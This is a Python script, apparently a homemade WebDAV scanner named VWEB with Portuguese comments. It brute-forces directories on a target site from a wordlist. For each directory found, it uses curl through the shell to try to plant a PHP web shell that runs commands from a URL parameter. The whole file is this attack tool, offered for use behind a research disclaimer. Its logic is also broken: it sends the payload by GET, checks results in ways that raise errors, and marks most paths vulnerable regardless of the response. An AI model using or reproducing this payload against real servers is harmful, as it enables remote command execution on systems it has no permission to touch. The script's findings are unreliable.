#CRIADOR: César Neves
"""
    ESSA FERRAMENTA FOI FEITA PARA FINS DE PESQUISAS DE VULNERABILIDADES PARA MAIS SISTEMAS SEGUROS.
    SE ALGUÉM USAR ESSA FERRAMENTA DO MODO EM ACHAR VULNERABILIDADES E EXPLORAR OU POSTAR AS MESMAS,
    CABE O USUARIO, CRIMES NÃO SÃO TRANSMISSÍVEIS.
"""
#importando os frameworks
import os #importando os
import sys #importando o framework sys
import requests #importando o framework request
import time #importando o framework time
import subprocess #importando subprocess
#usando o framework os
os.system("clear") #usando o framework os para limpar a tela (console)
#importando o desenho da ferramenta
import design #importando
#usando o metodo try and except
try: #trye
    #usando o framework sys
    alvo = input ("  DEGITE A URL ALVO: ") #adicionando argumento 
    #if len(sys.argv) != 2: #usando o if - se ao contar o número de argumentos for diferente a 2: execute
    #    #os.system("clear")
    #    #imprimento metodo de executar a ferramenta
    #    print ("\n\033[37m [+] FORMA DE USAR:\033[0m \033[94m python3 vweb.py https://exemplo.com\n")#print para imoprimir
    #    #usando o metodo para sair
    #    exit()#exit() para sair
#usando o metodo try and except
except IndexError: #except erro
    #os.system("clear")
    #imprimento metodo de executar a ferramenta
    #print ("\n\033[37m [+] FORMA DE USAR:\033[0m \033[94m python3 vweb.py https://exemplo.com\n")#print para imoprimir
    #usando o metodo para sair
    exit()#exit() para sair
#criando class
#"""
#    ESSA FERRAMENTA FOI FEITA PARA FINS DE PESQUISAS DE VULNERABILIDADES PARA MAIS SISTEMAS SEGUROS.
#    SE ALGUÉM USAR ESSA FERRAMENTA DO MODO EM ACHAR VULNERABILIDADES E EXPLORAR OU POSTAR AS MESMAS,
#    CABE O USUARIO, CRIMES NÃO SÃO TRANSMISSÍVEIS.
#"""
class __vweb_class__: #criando uma class __vweb_class__
    #criando uma função __inti__
    def __init__(self): #definições __init__
        #imprimindo nome
        print ("\033[37m [+] PROGRAMADOR:\033[0m \033[94m César Neves\n")#print
        #imprimindo nome da ferramenta
        print ("\033[37m [+] FERRAMENTE-NAME:\033[0m \033[94m VWEB\n")#print
        #imprimindo nome do Alvo
        print ("\033[37m [+] ALVO:\033[0m \033[94m {}\n".format(alvo))#print
    #definição para executar o código principal
    def __execute__coder__(self):
        #print ("\nÉ AQUI ONDE O CÓDIGO PRINCIPAL VAI ESTAR\n")
        #usando o metodo with para ler o ficheiro (diretorios.txt)
        with open("diretorios.txt","r") as myfiles: #with
            #imprimindo o nome da wordlist
            print ("\033[37m [+] DIRETORIO-LIST:\033[0m \033[94m {}\n".format(myfiles.name))#print
            #imprimindo op formato da wordlist
            print ("\033[37m [+] ENCODING:\033[0m \033[94m {}\n\n".format(myfiles.encoding))#print
            #usando o framework time, para dar um tempo de 2 segundos ates de executar o código
            #time.sleep(2)#sleep
            #lendo o arquivo
            lines = myfiles.readline()#readline()
            #usando o while para repetir, com a quantidade de linhas que tiver no arquivo
            num = 0
            while lines: #while
                #contagem / incrementação
                num = num + 1
                headers = {'Content-Type': 'text/xml', 'Depth': '1'}
                #executando if e elif
                if (alvo[-1:] == "/"):#if /se
                    #removendo último elemento da variavel
                    alvo_url = input ("  DEGITE A URL ALVO: ")#removendo
                    #removendo quebra de linha
                    line = lines.rstrip('\n')#remoendo quebra de linha usando rstip
                    #cocatenando o alvo com o diretorio
                    alvo_completo = alvo_url+"/"+line #mesclando
                    #type requestes
                    response_type = requests.request(method='PROPFIND', url=alvo_completo, headers=headers)#404/200
                    #usando try e except
                    try:#try
                        #connectando no alvo e Pegando respostas
                        resposta__url = requests.get(alvo_completo) #usando o framework requests
                        #usando trye except
                    except requests.exceptions.MissingSchema:#except erro
                        #imprimento metodo de executar a ferramenta
                        print ("\n\033[37m [+] FORMA DE USAR:\033[0m \033[94m python3 vweb.py https://exemplo.com\n")#print para imoprimir
                        exit()#saindo /quebrando o código
                    #usando if self e elif
                    if ("<Response [404]>" in str(resposta__url)) or (resposta__url == 404):#if
                        #o resultado de erro de diretorios
                        print ("""\033[31m [+] [{}] [+] {}\033[0m \033[91m [-DIR-] {} --ERRO-- {} \033[0m""".format("❌",alvo_completo,line,response_type.status_code))#erro
                        #configurando tempo de executar, o tempo em tempo
                        time.sleep(1)
                    #usando o if
                    if ("<Response [200]>" in str(resposta__url)) or (resposta__url == 200):#elif
                        #configurando vulnerabilidade webdav
                        alvo_webdav = alvo_url+"/"+line+"/shell_code.php"#webdav
                        list_web = alvo_url+"/"+line+"/webdav/shell_code.php"#webdav list
                        #configurando o curl, para fazer teste de webdav
                        webdav_request = subprocess.run(["curl -v -X GET -d '<?php system(/$_GET['admin']); ?>' {}".format(alvo_webdav)],shell=True,capture_output=True)#webdav
                        #configurando o curl, para fazer teste de webdav
                        lista_web_process = subprocess.run(["curl -v -X GET -d '<?php system(/$_GET['admin']); ?>' {}".format(list_web)],shell=True,capture_output=True)#webdav
                        #o resultado BOM de diretorios
                        print ("""\n \033[34m [+] [{}] [+] {}\033[0m \033[94m [-DIR-] {} --GOOD-- {} \n\033[0m""".format("✅",alvo_completo,line,response_type.status_code))#bom
                        #print ("")
                        try:#try
                            #if
                            if ("404" in lista_web_process) or ("404" in webdav_request):#usando if
                                #usando print para imprimir webdav
                                print ("        [+] WEBDAV: {} \033[91m --NÃO VULNERAVEL-- \n\033[0m".format(alvo_webdav))#não vulneravel
                            #elif
                            elif ("404" not in lista_web_process) or ("404" not in webdav_request):#usando elif
                                #usando print para imprimir webdav
                                print ("        [+] WEBDAV: {} --VULNERAVEL-- \n".format(alvo_webdav))#não vulneravel
                            #usando else
                            else:
                                #usando print para imprimir webdav
                                print ("        [+] WEBDAV: {} \033[91m --ERRO-- \n\033[0m".format(alvo_webdav))#ELSEE
                        except TypeError:
                            #imprindo não Vulneravel
                            print ("        [+] WEBDAV: "+alvo_webdav+"\033[91m --NÃO VULNERAVEL-- \n\033[0m")#não vulneravel
                        #usando if e elif
                        try:
                            if ("404" in webdav_request) or ("404" in lista_web_process):#if in
                                #imprindo não Vulneravel
                                print ("        [+] WEBDAV: {} \033[91m --NÃO VULNERAVEL-- \n\033[0m".format(list_web))#não vulneravel
                            #usando elif
                            elif ("404" not in webdav_request) or ("404" not in lista_web_process):#elif
                                #imprindo vulneraveis
                                print ("        [+] WEBDAV: {} --VULNERAVEL--\n".format(list_web))#vulneraveis
                            #usando else
                            else:
                                print ("        [+] WEBDAV: {} \033[91m --ERRO-- \n\033[0m".format(list_web))#ELSEE
                        except TypeError:
                            #imprindo não Vulneravel
                            print ("        [+] WEBDAV: "+list_web+" \033[91m --NÃO VULNERAVEL-- \033[0m")#não vulneravel
                        print ("")
                        #configurando tempo de executar, o tempo em tempo
                        time.sleep(1)#time
                #ESPAÇO PARA LER BEM O CÓDIGO
                #"""
                #    ESSA FERRAMENTA FOI FEITA PARA FINS DE PESQUISAS DE VULNERABILIDADES PARA MAIS SISTEMAS SEGUROS.
                #    SE ALGUÉM USAR ESSA FERRAMENTA DO MODO EM ACHAR VULNERABILIDADES E EXPLORAR OU POSTAR AS MESMAS,
                #    CABE O USUARIO, CRIMES NÃO SÃO TRANSMISSÍVEIS.
                #"""
                #usando o elif
                elif (alvo[-1:] != "/"):#elif
                    #usando rstrip para remover quebra de linha
                    headers2 = {'Content-Type': 'text/xml', 'Depth': '1'}
                    line = lines.rstrip('\n')#rstrip
                    #mesclando variaveis
                    alvo_completo2 = alvo+"/"+line#var: alvo/line DIR
                    response_type2 = requests.request(method='PROPFIND', url=alvo_completo2, headers=headers2)
                    #usando try e except
                    try:#try
                        #armazenando a resposta do framework requests
                        resposta__url2 = requests.get(alvo_completo2)#usando o framework requests
                    #usando except
                    except requests.exceptions.MissingSchema:#except erro
                        #imprimento metodo de executar a ferramenta
                        print ("\n\033[37m [+] FORMA DE USAR:\033[0m \033[94m python3 vweb.py https://exemplo.com\n")#print para imoprimir
                        exit() #saindo /quebrando o código
                    #usando if e if
                    if ("<Response [404]>" in str(resposta__url2)) or (resposta__url2 == 404):#usando if /if
                        #o resultado de erro de diretorios
                        print ("""\033[31m [+] [{}] [+] {}\033[0m \033[91m [-DIR-] {} --ERRO-- {} \033[0m""".format("❌",alvo_completo2,line,response_type2.status_code))#erro
                        #tempo de executar o código
                        time.sleep(1)#usando o framework time
                    #usando if
                    if ("<Response [200]>" in str(resposta__url2)) or (resposta__url2 == 200):#if /if
                                                #configurando vulnerabilidade webdav
                        alvo_webdav2 = alvo+"/"+line+"/shell_code.php"#webdav
                        list_web3 = alvo+"/"+line+"/webdav/shell_code.php"#webdav
                        #configurando o curl, para fazer teste de webdav
                        webdav_request2 = subprocess.run(["curl -v -X GET -d '<?php system(/$_GET['admin']); ?>' {}".format(alvo_webdav2)],shell=True,capture_output=True)#webdav
                        #configurando o curl, para fazer teste de webdav
                        lista_web_process2 = subprocess.run(["curl -v -X GET -d '<?php system(/$_GET['admin']); ?>' {}".format(list_web3)],shell=True,capture_output=True)#webdav
                        #o resultado Bom de diretorios
                        print ("""\n \033[34m [+] [{}] [+] {}\033[0m \033[94m [-DIR-] {} --GOOD-- {} \n\033[0m""".format("✅",alvo_completo2,line,response_type2.status_code))#bom
                        #try e except
                        try:#try
                            #if
                            if ("404" in lista_web_process2) or ("404" in webdav_request2):#usando if
                                #usando print para imprimir webdav
                                print ("        [+] WEBDAV: {} \033[91m --NÃO VULNERAVEL-- \n\033[0m".format(alvo_webdav2))#não vulneravel
                            #elif
                            elif ("404" not in lista_web_process2) or ("404" not in webdav_request2):#usando elif
                                #usando print para imprimir webdav
                                print ("        [+] WEBDAV: {} --VULNERAVEL-- \n".format(alvo_webdav2))#não vulneravel
                            #usando else
                            else:
                                #usando print para imprimir webdav
                                print ("        [+] WEBDAV: {} \033[91m --ERROR-- \n\033[0m\n".format(alvo_webdav2))#ELSEE
                        #except
                        except TypeError:#except
                            #imprindo não Vulneravel
                            print ("        [+] WEBDAV: "+alvo_webdav2+"\033[91m --NÃO VULNERAVEL-- \n\033[0m")#não vulneravel
                        #usando if e elif
                        try:
                            if ("404" in webdav_request2) or ("404" in lista_web_process2):#if in
                                #imprindo não Vulneravel
                                print ("        [+] WEBDAV: {} \033[91m --NÃO VULNERAVEL-- \n\033[0m".format(list_web3))#não vulneravel
                            #usando elif
                            elif ("404" not in webdav_request) or ("404" not in lista_web_process):#elif
                                #imprindo vulneraveis
                                print ("        [+] WEBDAV: {} --VULNERAVEL--\n".format(list_web3))#vulneraveis
                            #usando else
                            else:
                                print ("        [+] WEBDAV: {} \033[91m --ERRO-- \n\033[0m\n".format(list_web3))#ELSEE
                        #usando except
                        except TypeError:#except
                            #imprindo não Vulneravel
                            print ("        [+] WEBDAV: "+list_web3+"\033[91m --NÃO VULNERAVEL-- \033[0m")#não vulneravel
                        print ("")
                        #tempo de executar o scriptp
                        time.sleep(1)#time /usando framework
                #else:
                #    print ("\nNão logado\n")
                #print ("/"+lines)#print
                #lendo o arquivo
                lines = myfiles.readline()#readline()
                #executando line que armazena myfiles.readline()
#"""
#    ESSA FERRAMENTA FOI FEITA PARA FINS DE PESQUISAS DE VULNERABILIDADES PARA MAIS SISTEMAS SEGUROS.
#    SE ALGUÉM USAR ESSA FERRAMENTA DO MODO EM ACHAR VULNERABILIDADES E EXPLORAR OU POSTAR AS MESMAS,
#    CABE O USUARIO, CRIMES NÃO SÃO TRANSMISSÍVEIS.
#"""
#usando o metodo __main__
if __name__ == "__main__": #metodo __name__
    #executando classe
    __class__execute__ = __vweb_class__() #executando a class
    #executando classe chamando a função __execute__coder__
    __class__execute__.__execute__coder__()#executando classe chamando a função __execute__coder__
#NATHING
#"""
#    ESSA FERRAMENTA FOI FEITA PARA FINS DE PESQUISAS DE VULNERABILIDADES PARA MAIS SISTEMAS SEGUROS.
#    SE ALGUÉM USAR ESSA FERRAMENTA DO MODO EM ACHAR VULNERABILIDADES E EXPLORAR OU POSTAR AS MESMAS,
#    CABE O USUARIO, CRIMES NÃO SÃO TRANSMISSÍVEIS.
#"""

#NATHING